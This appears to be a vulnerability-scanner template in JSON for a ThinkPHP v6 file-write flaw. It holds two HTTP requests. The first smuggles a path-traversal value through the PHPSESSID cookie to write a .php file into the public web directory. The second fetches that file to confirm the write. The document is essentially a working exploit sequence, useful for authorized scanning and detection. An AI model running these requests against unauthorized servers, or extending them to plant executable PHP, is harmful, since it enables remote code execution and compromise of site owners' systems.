{
    "Name": "thinkphp-v6-file-write",
    "Description": "thinkphp-v6-file-write",
    "Product": "thinkphp",
    "author": "chumeng",
    "Request":[
        {
        "Method": "GET",
        "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36","Cookie":"PHPSESSID=../../../../public/chumengchumeng.php"},
        "Uri":"/index.php?a=chumengchumeng",
        "Port":"",
        "Data":"",
        "Follow_redirects":"false",
        "Upload":{"Name": "","fileName": "","filePath": "" },
        "Response":{
        "Check_Steps":"AND",
        "Checks": [
             {
                "Operation": "contains",
                "Key":"set-cookie",
                "Value": "chumengchumeng"
             },
                 {
                "Operation": "code", 
                "Key":"",
                "Value": "200"  
                 }
        ]
        },
        "Next_decide":"AND"
                },
                {
                    "Method": "GET",
                    "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36","Cookie":"PHPSESSID=../../../../public/chumengchumeng.php"},
                    "Uri":"/chumengchumeng.php",
                    "Port":"",
                    "Data":"",
                    "Follow_redirects":"false",
                    "Upload":{"Name": "","fileName": "","filePath": "" },
                    "Response":{
                    "Check_Steps":"AND",
                    "Checks": [
                        {
                            "Operation": "contains",
                        "Key":"",
                            "Value": "chumengchumeng"
                        },
                             {
                            "Operation": "code", 
                            "Key":"",
                            "Value": "200"  
                             }
                    ]
                    },
                    "Next_decide":""
                            }
]}
